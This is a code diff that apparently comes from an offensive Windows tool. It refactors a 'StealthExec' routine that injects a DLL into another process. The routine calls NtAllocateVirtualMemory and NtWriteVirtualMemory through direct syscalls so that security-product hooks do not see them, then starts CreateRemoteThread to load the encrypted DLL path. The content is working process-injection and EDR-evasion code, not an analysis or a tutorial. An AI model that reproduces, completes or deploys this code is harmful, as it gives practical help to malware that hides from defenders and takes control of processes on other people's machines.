@@ -5,10 +5,6 @@
 #include "detector.h"
 #include "evasion.h"
 
-// Function Prototypes
-typedef NTSTATUS(NTAPI* pSysAlloc)(HANDLE, PVOID*, ULONG, PSIZE_T, ULONG, ULONG);
-typedef NTSTATUS(NTAPI* pSysWrite)(HANDLE, PVOID, PVOID, ULONG, PULONG);
-
 // Function to Resolve APIs
 FARPROC ResolveFn(LPCSTR mod, LPCSTR fn) {
     HMODULE hMod = GetModuleHandle(mod);
@@ -64,65 +60,26 @@ void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllEnc) {
         return;
     }
 
-    //pSysAlloc pAlloc = (pSysAlloc)ResolveFn("ntdll.dll", "NtAllocateVirtualMemory");
-    pSysWrite pWrite = (pSysWrite)ResolveFn("ntdll.dll", "NtWriteVirtualMemory");
-
-    // if (!pAlloc || !pWrite) {
-    //     printf("[!] Unable to resolve NT functions.\n");
-    //     return;
-    // }
-
-    // Allocate Memory
-    // status = pAlloc(hProc, &memLoc, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    // if (status != 0) {
-    //     printf("[!] Memory allocation failed (Err: 0x%lX).\n", status);
-    //     return;
-    // }
-
     SetSystemCall(GetSyscallNumber("NtAllocateVirtualMemory"));
-
-    printf("[*] BEFORE SYSCALL:\n");
-    printf("  BaseAddress: %p\n", memLoc);
-    printf("  RegionSize: %llu\n", sz);
-    status = myNtAllocateVirtualMemory(hProc, &memLoc, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    printf("[*] AFTER SYSCALL:\n");
-    printf("  BaseAddress: %p\n", memLoc);
-    printf("  RegionSize: %llu\n", sz);
-    
+    status = custAVM(hProc, &memLoc, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (status != 0) {
         printf("[!] NtAllocateVirtualMemory failed! Status: 0x%lX\n", status);
     } else {
         printf("[+] Memory allocated at: %p\n", memLoc);
     }
+
     if (memLoc == NULL) {
         printf("[!] Memory allocation failed, BaseAddress is NULL.\n");
         return;
     }
-    ULONG oldProtect;
-    DWORD syscallId_Protect = GetSyscallNumber("NtProtectVirtualMemory");
-    printf("Syscall ID NtProtectVirtualMemory: 0x%llx\n", (unsigned long long)syscallId_Protect);
-    status = myNtProtectVirtualMemory(hProc, &memLoc, &sz, PAGE_READWRITE, &oldProtect);
-    if (status != 0) {
-        printf("[!] NtProtectVirtualMemory failed! Status: 0x%lX\n", status);
-        return;
-    }
-    printf("[+] Memory protection changed to PAGE_READWRITE.\n");
-    
-    DWORD syscallId_Write = GetSyscallNumber("NtWriteVirtualMemory");
-    printf("Syscall ID NtWriteVirtualMemory: 0x%llx\n", (unsigned long long)syscallId_Write);
+
+    SetSystemCall(GetSyscallNumber("NtWriteVirtualMemory"));
     // Write Encrypted DLL Path to Remote Process
-    status = myNtWriteVirtualMemory(hProc, memLoc, (PVOID)dllEnc, (ULONG)sz, NULL);
+    status = custWVM(hProc, memLoc, (PVOID)dllEnc, (ULONG)sz, NULL);
     if (status != 0) {
         printf("[!] Memory write failed (Err: 0x%lX).\n", status);
         return;
     }
-
-    // // Write Encrypted DLL Path to Remote Process
-    // status = pWrite(hProc, memLoc, (PVOID)dllEnc, (ULONG)sz, NULL);
-    // if (status != 0) {
-    //     printf("[!] Memory write failed (Err: 0x%lX).\n", status);
-    //     return;
-    // }
 
     // Load Remote DLL
     hThreadRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL);
